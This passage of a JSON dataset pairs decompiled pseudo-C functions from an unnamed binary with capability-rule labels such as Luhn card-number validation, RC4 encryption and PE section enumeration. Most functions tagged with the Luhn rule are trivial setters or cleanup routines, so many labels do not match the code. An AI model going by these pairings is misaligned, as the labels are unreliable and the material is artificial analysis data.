        "decompiled_code": "\nvoid __cdecl fcn.000517b0(uint noname_0, int32_t arg_ch, uint arg_10h)\n\n{\n    *(arg_ch + 0x1c + *(arg_ch + 0x1e)) = arg_10h;\n    fcn.000340b0(arg_ch + 0x3c);\n    if (*(arg_ch + 0x38) == 0x70724152) {\n        fcn.0004dcc0(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "00051e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00051e50(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_4h;\n    \n    *(arg_8h + 0x43c) = arg_ch;\n    fcn.000340b0(arg_8h + 0x438);\n    return;\n}\n",
        "token_count": 71
    },
    "00052590": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00052590(int32_t arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = arg_8h;\n    var_4h = *(arg_ch + 0x40);\n    if (*0x10 != 0x14) {\n        if ((*(var_4h + 6) & 5) == 0) {\n            var_1ch = (**0xb1bde224)(var_4h, 0);\n        }\n        else {\n            var_1ch = *(var_4h + 0xc);\n        }\n        var_10h = var_1ch;\n    }\n    var_ch = *(var_4h + 0x14);\n    fcn.00051140(arg_ch, 0, 0, &var_14h, &var_18h);\n    fcn.000524f0(*(var_8h + 0x430), var_10h, var_ch, var_10h + var_ch, arg_14h);\n    (**0xb1bde060)(arg_ch);\n    (**0xb1bde2ac)(var_4h);\n    (**0xb1bde2ac)(var_14h);\n    fcn.00035330(var_10h);\n    return;\n}\n",
        "token_count": 354
    },
    "00052b30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00052b30(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00034c90();\n    if (iVar1 < 0x1b) {\n        fcn.00035330(arg_8h);\n    }\n    else {\n        fcn.00044f10(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "00054600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00054600(uint arg_8h, uint arg_ch, uint16_t *arg_10h, ushort *arg_14h, uint arg_18h)\n\n{\n    ushort uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    ushort extraout_var;\n    uint arg_8h_01;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    uint var_18h;\n    ushort var_12h;\n    ushort var_10h;\n    ushort var_eh;\n    ushort var_ch;\n    ushort var_ah;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    (**0xb1bde100)(&var_8h);\n    bVar7 = var_8h < *0xb1c5a7a0;\n    var_8h = var_8h - *0xb1c5a7a0;\n    var_4h = (var_4h - *0xb1c5a7a4) - bVar7;\n    fcn.000360b0(&var_8h, &var_18h);\n    arg_8h_01 = CONCAT22(extraout_var, *arg_14h);\n    uVar2 = fcn.000354c0(arg_8h_01);\n    uVar2 = uVar2 & 0xffff;\n    uVar4 = *(arg_14h + 5);\n    uVar3 = *(arg_14h + 2);\n    uVar6 = *(arg_14h + 3);\n    uVar5 = *(arg_14h + 1);\n    arg_8h_00 = arg_14h & 0xffff0000 | *arg_10h;\n    uVar1 = fcn.000354c0(arg_8h_00);\n    fcn.0007865e(arg_8h, 0xb1be2688, var_18h, var_18h._2_2_, var_12h, var_10h, var_eh, var_ch, var_ah, arg_ch, \n                 *(arg_10h + 1), *(arg_10h + 3), *(arg_10h + 2), *(arg_10h + 5), uVar1, arg_8h_00, uVar5, uVar6, uVar3, \n                 uVar4, uVar2, arg_8h_01, arg_18h);\n    return;\n}\n",
        "token_count": 592
    },
    "00057030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00057030(int32_t arg_8h)\n\n{\n    *(arg_8h * 0x3c + -0x4e3a8450) = *(arg_8h * 0x3c + -0x4e3a8450) + 1;\n    return;\n}\n",
        "token_count": 73
    },
    "00057060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00057060(int32_t arg_8h)\n\n{\n    *(arg_8h * 0x3c + -0x4e3a844c) = *(arg_8h * 0x3c + -0x4e3a844c) + 1;\n    return;\n}\n",
        "token_count": 73
    },
    "00057370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00057370(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t var_94h;\n    uint var_90h;\n    uint *var_8ch;\n    uint var_88h;\n    uint var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    uint var_70h;\n    uint *var_6ch;\n    uint var_68h;\n    uint var_60h;\n    uint *var_5ch;\n    uint var_58h;\n    uint var_50h;\n    uint *var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 0;\n    if (*0xb1c5b707 == '\\0') {\n        uVar1 = 0x21590006;\n    }\n    else {\n        iVar2 = fcn.00020650(arg_10h, 0x58, 3, &var_94h, 4);\n        if (iVar2 == 0) {\n            var_94h = 0;\n        }\n        *arg_14h = 3;\n        var_10h = 5;\n        var_ch = &var_3ch;\n        var_3ch = 0x2a;\n        var_38h = 2;\n        var_34h = 0x2b;\n        var_30h = 2;\n        var_2ch = 0x2c;\n        var_28h = 2;\n        var_24h = 0x2d;\n        var_20h = 2;\n        var_1ch = 0x2e;\n        var_18h = 2;\n        var_14h = &var_90h;\n        var_8h = 1;\n        var_4h = &var_14h;\n        fcn.00078790(&var_90h, 0, 0x50);\n        var_8ch = &var_88h;\n        var_90h = 4;\n        var_88h = *(var_94h * 0x3c + -0x4e3a8450);\n        var_7ch = &var_78h;\n        var_80h = 4;\n        var_78h = *(var_94h * 0x3c + -0x4e3a844c);\n        var_6ch = &var_68h;\n        var_70h = 4;\n        var_68h = *(var_94h * 0x3c + -0x4e3a8448);\n        var_5ch = &var_58h;\n        var_60h = 4;\n        var_58h = *(var_94h * 0x3c + -0x4e3a8444);\n        var_4ch = &var_48h;\n        var_50h = 4;\n        var_48h = *(var_94h * 0x3c + -0x4e3a8440);\n        uVar1 = fcn.0002ee00(&var_10h, arg_18h, arg_1ch);\n    }\n    return uVar1;\n}\n",
        "token_count": 852
    },
    "0005b230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0005b230(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t var_4h;\n    \n    if (arg_8h % arg_ch == 0) {\n        var_4h = arg_8h;\n    }\n    else {\n        var_4h = (arg_8h / arg_ch + 1) * arg_ch;\n    }\n    return var_4h;\n}\n",
        "token_count": 101
    },
    "0005feb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0005feb0(int32_t arg_8h)\n\n{\n    *(arg_8h + 0x100) = 0;\n    *(arg_8h + 0x102) = 0;\n    *(arg_8h + 0x103) = 0;\n    *(arg_8h + 0x104) = 0;\n    *(arg_8h + 0x105) = 0;\n    *(arg_8h + 0x108) = 0;\n    *(arg_8h + 0x106) = 0;\n    *(arg_8h + 0x102) = 0;\n    *(arg_8h + 0x101) = 0;\n    *(arg_8h + 0x109) = 0;\n    *(arg_8h + 0x9c) = 0x24c;\n    *(arg_8h + 0x98) = 0;\n    *(arg_8h + 0xa0) = 0;\n    *(arg_8h + 0xa4) = 0;\n    *(arg_8h + 0xa8) = 0;\n    *(arg_8h + 0xac) = 0;\n    *(arg_8h + 0xb0) = 0;\n    *(arg_8h + 0xb4) = 0;\n    *(arg_8h + 0xb8) = 0;\n    *(arg_8h + 0xbc) = 0;\n    *(arg_8h + 0xc0) = 0;\n    *(arg_8h + 0xc4) = 0;\n    *(arg_8h + 200) = 0;\n    *(arg_8h + 0xcc) = 0;\n    *(arg_8h + 0xd0) = 0;\n    *(arg_8h + 0xd4) = 0;\n    *(arg_8h + 0xd8) = 0;\n    *(arg_8h + 0xdc) = 0;\n    *(arg_8h + 0xe0) = 0;\n    *(arg_8h + 0xe4) = 0;\n    *(arg_8h + 0xe8) = 0;\n    *(arg_8h + 0xec) = 0;\n    *(arg_8h + 0xf0) = 0;\n    *(arg_8h + 0xf4) = 0;\n    *(arg_8h + 0xf8) = 0;\n    *(arg_8h + 0xfc) = 0;\n    return;\n}\n",
        "token_count": 596
    },
    "00060770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.00060770(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint var_1h;\n    \n    if (*(arg_8h + 0x10) < *(arg_8h + 0x14)) {\n        uVar1 = **(arg_8h + 0x10);\n        *(arg_8h + 0x10) = *(arg_8h + 0x10) + 1;\n    }\n    else {\n        uVar1 = 0xffffffff;\n    }\n    return uVar1;\n}\n",
        "token_count": 147
    },
    "000607b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000607b0(uint *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    *arg_8h = 0xb1c2d770;\n    arg_8h[4] = arg_ch;\n    arg_8h[5] = arg_ch + arg_10h;\n    *(arg_8h + 1) = 0;\n    *(arg_8h + 5) = 0;\n    *(arg_8h + 3) = 0;\n    return;\n}\n",
        "token_count": 124
    },
    "00060b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00060b70(int32_t arg_8h)\n\n{\n    fcn.00078790(arg_8h, 0, 600);\n    fcn.00060c10(arg_8h, 0x10);\n    *(arg_8h + 0x9c) = 0x215;\n    fcn.00060c50(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 98
    },
    "00060c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00060c90(int32_t arg_8h)\n\n{\n    return arg_8h + 0x212;\n}\n",
        "token_count": 35
    },
    "00061750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00061750(uint *arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *arg_ch;\n    uVar2 = *arg_8h;\n    uVar3 = fcn.0001abc0(uVar2, uVar1, (-(arg_10h != 0) & 0xfffffffe) + 2, arg_14h);\n    *arg_8h = uVar2;\n    *arg_ch = uVar1;\n    return uVar3;\n}\n",
        "token_count": 167
    },
    "00061960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00061960(void)\n\n{\n    fcn.00035330(*0xb1c67750);\n    *0xb1c67750 = 0;\n    return;\n}\n",
        "token_count": 42
    },
    "000619a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000619a0(void)\n\n{\n    fcn.00035330(*0xb1c67750);\n    fcn.00035330(*0xb1c6774c);\n    return;\n}\n",
        "token_count": 47
    },
    "00066450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00066450(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_88h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\n    while (iVar1 = fcn.00077cd0(&var_4h, &var_88h, 0x80, &var_8h),  iVar1 != 0) {\n        iVar1 = fcn.0007861c(&var_88h, 0xb1be2854);\n        if (iVar1 == 0) {\n            uVar2 = fcn.00037500(var_8h, arg_8h + 0x134);\n            *(arg_8h + 0x130) = uVar2;\n        }\n        else {\n            iVar1 = fcn.0007861c(&var_88h, 0xb1be285c);\n            if (iVar1 == 0) {\n                uVar2 = fcn.00035eb0(var_8h, 0, 0);\n                *(arg_8h + 0x13c) = uVar2;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 282
    },
    "00066b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00066b60(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    iVar1 = fcn.00037560(arg_8h + 0x134, &var_10h);\n    if (iVar1 != 0) {\n        fcn.000664f0(arg_8h, var_ch, var_8h, 0);\n        fcn.00035330(var_ch);\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "00066de0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00066de0(int32_t arg_8h)\n\n{\n    fcn.00075d60(arg_8h + 4, 0);\n    fcn.00075d60(arg_8h + 8, 0);\n    return;\n}\n",
        "token_count": 62
    },
    "00067110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00067110(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    fcn.00034550(arg_8h + 0x14);\n    uVar1 = fcn.00067160(arg_8h, 0, 0, arg_ch, arg_10h, arg_14h, arg_18h);\n    fcn.000345c0(arg_8h + 0x14);\n    return uVar1;\n}\n",
        "token_count": 137
    },
    "00067950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067950(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    \n    var_9ch = arg_ch;\n    var_98h = arg_10h;\n    var_94h = arg_14h;\n    var_a0h = 0;\n    fcn.00077ff0(arg_8h + 0x92, &var_90h);\n    fcn.00067ab0(arg_8h, &var_a0h, &var_90h);\n    return;\n}\n",
        "token_count": 164
    },
    "00067a50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00067a50(int32_t arg_8h, uint arg_ch)\n\n{\n    uint var_90h;\n    \n    fcn.00077ff0(arg_8h + 0x92, &var_90h);\n    fcn.00067ab0(arg_8h, arg_ch, &var_90h);\n    return;\n}\n",
        "token_count": 82
    },
    "0006a870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0006a870(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_4h;\n    \n    *(arg_8h + 0x24) = 1;\n    fcn.00034550(arg_8h + 0x130);\n    for (var_4h = 0; var_4h < 0xb; var_4h = var_4h + 1) {\n        fcn.00075d60(arg_8h + 0x34 + var_4h * 0x18, 1);\n    }\n    fcn.00075d60(arg_8h + 0x14, 0);\n    for (var_4h = 0; var_4h < 0xb; var_4h = var_4h + 1) {\n        iVar1 = fcn.00037240(arg_8h + 0x2c + var_4h * 0x18);\n        if (iVar1 != 0) {\n            fcn.00037270(arg_8h + 0x2c + var_4h * 0x18, 0);\n            fcn.00037220(arg_8h + 0x2c + var_4h * 0x18);\n            *(arg_8h + 0x28 + var_4h * 0x18) = 3;\n        }\n    }\n    fcn.000345c0(arg_8h + 0x130);\n    return;\n}\n",
        "token_count": 360
    },
    "0006a950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006a950(int32_t arg_8h)\n\n{\n    fcn.00034520(arg_8h + 0x130);\n    fcn.00034520(arg_8h + 0x18);\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 70
    },
    "0006aa50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_90h\n\nvoid __cdecl fcn.0006aa50(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *var_90h;\n    char *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = arg_8h;\n    var_4h = arg_ch;\n    while( true ) {\n        var_90h = &var_4h;\n        iVar1 = fcn.00077cd0(var_90h, &var_90h, 0x80, &var_ch);\n        if (iVar1 == 0) break;\n        iVar1 = fcn.0007861c(&var_90h, 0xb1be2898);\n        if ((iVar1 == 0) && ((iVar1 = fcn.00035fe0(*var_ch),  iVar1 == 0x59 || (*var_ch == '1')))) {\n            *(var_8h + 0x148) = 1;\n        }\n        else {\n            iVar1 = fcn.0007861c(&var_90h, 0xb1be28a8);\n            if ((iVar1 == 0) && ((iVar1 = fcn.00035fe0(*var_ch),  iVar1 == 0x59 || (*var_ch == '1')))) {\n                *(var_8h + 0x14c) = 1;\n            }\n        }\n    }\n    fcn.00076270(*(arg_8h + 0x14), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 375
    },
    "0006aba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006aba0(uint noname_0, uint arg_ch)\n\n{\n    fcn.00035200(arg_ch);\n    return;\n}\n",
        "token_count": 36
    },
    "0006b730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006b730(int32_t arg_8h)\n\n{\n    int32_t var_4h;\n    \n    for (var_4h = 0; var_4h < *(arg_8h + 0xb8); var_4h = var_4h + 1) {\n        fcn.00035330(*(arg_8h + 0x1c + var_4h * 0x10));\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0006be90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0006be90(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_4h;\n    \n    fcn.00036a10(0xb1c5a7e4);\n    uVar1 = fcn.00035e60(&var_4h);\n    fcn.00078748(uVar1);\n    iVar2 = fcn.00033ff0(0xb1c5a7e0);\n    if (iVar2 == 0) {\n        fcn.00036a80(0xb1c5a7e4);\n        uVar1 = 0;\n    }\n    else {\n        iVar2 = fcn.0001a8e0(0xb1c5a7d8, 0xb1c39b80, 0);\n        if (iVar2 == 0) {\n            *0xb1c6776c = 1;\n            uVar1 = 1;\n        }\n        else {\n            fcn.00036a80(0xb1c5a7e4);\n            fcn.00034080(0xb1c5a7e0);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 273
    },
    "0006cf70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006cf70(int32_t arg_8h)\n\n{\n    fcn.00073b30(arg_8h + 4, 0);\n    return;\n}\n",
        "token_count": 43
    },
    "0006cf90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006cf90(int32_t arg_8h)\n\n{\n    fcn.00034520(arg_8h + 8);\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 51
    },
    "0006d080": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_88h\n\nvoid __cdecl fcn.0006d080(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *var_88h;\n    char *var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\n    while( true ) {\n        var_88h = &var_4h;\n        iVar1 = fcn.00077cd0(var_88h, &var_88h, 0x80, &var_8h);\n        if (iVar1 == 0) break;\n        iVar1 = fcn.0007861c(&var_88h, 0xb1be28e8);\n        if ((iVar1 == 0) && ((*var_8h == '1' || (iVar1 = fcn.00035fe0(*var_8h),  iVar1 == 0x59)))) {\n            *(arg_8h + 0x10) = 1;\n        }\n    }\n    fcn.00074020(*(arg_8h + 4), arg_ch, 0);\n    return;\n}\n",
        "token_count": 261
    },
    "0006e850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006e850(int32_t arg_8h)\n\n{\n    fcn.00034520(arg_8h + 0x28);\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 53
    },
    "0006e980": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_88h\n\nvoid __cdecl fcn.0006e980(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *var_88h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = arg_ch;\n    while( true ) {\n        var_88h = &var_4h;\n        iVar1 = fcn.00077cd0(var_88h, &var_88h, 0x80, &var_8h);\n        if (iVar1 == 0) break;\n        iVar1 = fcn.0007861c(&var_88h, 0xb1be2900);\n        if (iVar1 == 0) {\n            *(arg_8h + 0xc) = 0;\n            *(arg_8h + 0x10) = 0;\n            *(arg_8h + 0x14) = 0;\n            *(arg_8h + 0x18) = 0;\n            fcn.00078652(arg_8h + 0xc, var_8h, 0x10);\n        }\n        else {\n            iVar1 = fcn.0007861c(&var_88h, 0xb1be2904);\n            if (iVar1 == 0) {\n                *(arg_8h + 0xc) = 0;\n                *(arg_8h + 0x10) = 0;\n                *(arg_8h + 0x14) = 0;\n                *(arg_8h + 0x18) = 0;\n                fcn.00078652(arg_8h + 0xc, var_8h, 0x10);\n                *(arg_8h + 0x2c) = 1;\n            }\n        }\n    }\n    fcn.00076270(*(arg_8h + 4), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 451
    },
    "0006f000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006f000(uint noname_0, uint arg_ch)\n\n{\n    fcn.00035330(arg_ch);\n    return;\n}\n",
        "token_count": 36
    },
    "0006f6d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0006f6d0(int32_t arg_8h, uint arg_ch)\n\n{\n    fcn.00075d60(arg_8h + 4, arg_ch);\n    return;\n}\n",
        "token_count": 49
    },
    "000720d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000720d0(int32_t arg_8h)\n\n{\n    fcn.00034080(arg_8h + 0x54);\n    fcn.00034520(arg_8h + 0x48);\n    fcn.00034520(arg_8h + 0x1c);\n    fcn.00034520(arg_8h + 0x18);\n    fcn.00035330(arg_8h);\n    return;\n}\n",
        "token_count": 105
    },
    "000735b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000735b0(uint *arg_8h)\n\n{\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    fcn.00032220(arg_8h + 4);\n    fcn.00033ff0(arg_8h + 3);\n    return;\n}\n",
        "token_count": 112
    },
    "000773e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000773e0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00077aa0(arg_8h);\n    if (iVar1 == 0) {\n        uVar2 = *(*arg_8h + 0x14);\n        fcn.00036b60(*arg_8h + 4);\n    }\n    else {\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 130
    },
    "00077a60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00077a60(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00077aa0(arg_8h);\n    if (iVar1 == 0) {\n        (**(**arg_8h + 0x40))(arg_8h, arg_ch);\n        fcn.00036b60(*arg_8h + 1);\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "00078060": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00078060(uint *arg_8h, uint *arg_ch)\n\n{\n    *arg_8h = 1;\n    *(arg_8h + 1) = 0xe;\n    *(arg_8h + 6) = 2;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    *(arg_8h + 5) = 0;\n    *arg_ch = 0x16;\n    return;\n}\n",
        "token_count": 126
    },
    "0001a660": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001a660(uint noname_0, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = (**(arg_ch + 0x10))(*(arg_ch + 0x14));\n    *(arg_ch + 0x18) = uVar1;\n    (**0xb1bde0c0)(arg_ch, 0, 0);\n    return;\n}\n",
        "token_count": 101
    },
    "000607f0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000607f0(int32_t arg_8h)\n\n{\n    uint var_4h;\n    \n    if ((*(arg_8h + 4) == *(arg_8h + 5)) && (*(arg_8h + 0x18) != '\\0')) {\n        var_4h = 1;\n    }\n    else {\n        var_4h = 0;\n    }\n    return var_4h;\n}\n",
        "token_count": 100
    },
    "00060a20": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nulong __cdecl fcn.00060a20(uint arg_8h)\n\n{\n    uchar uVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    ulong uVar4;\n    ulong uVar5;\n    ulong uVar6;\n    ulong uVar7;\n    ulong uVar8;\n    ulong uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar11 = arg_8h;\n    uVar2 = fcn.00060830(arg_8h);\n    uVar10 = arg_8h;\n    uVar1 = fcn.00060830(arg_8h);\n    uVar3 = fcn.0007879c(uVar10, uVar11, uVar1, 0);\n    fcn.00060830(arg_8h);\n    uVar4 = fcn.0007879c();\n    fcn.00060830(arg_8h);\n    uVar5 = fcn.0007879c();\n    fcn.00060830(arg_8h);\n    uVar6 = fcn.0007879c();\n    fcn.00060830(arg_8h);\n    uVar7 = fcn.0007879c();\n    fcn.00060830(arg_8h);\n    uVar8 = 